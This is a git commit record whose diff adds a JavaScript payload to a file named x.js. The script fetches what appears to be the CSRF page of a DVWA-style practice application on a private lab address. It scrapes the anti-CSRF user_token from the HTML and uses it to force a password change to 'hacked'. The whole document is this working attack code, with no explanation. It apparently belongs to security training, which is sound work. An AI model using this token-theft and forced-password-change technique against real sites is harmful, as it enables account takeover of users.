25a7860416334d666d55d19e907b04c2b5351615
Hồ Việt Khánh <111210714+HK4zCzi@users.noreply.github.com>
2026-03-30 00:45:45 +0700

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,12 @@
+<script>
+var req = new XMLHttpRequest();
+req.open("GET", "http://192.168.37.132:4280/vulnerabilities/csrf/", false);
+req.send();
+var html = req.responseText;
+var match = html.match(/user_token[^>]+value='([^']+)'/);
+var token = match[1];
 
+var req2 = new XMLHttpRequest();
+req2.open("GET", "http://192.168.37.132:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change&user_token="+token, false);
+req2.send();
+</script>
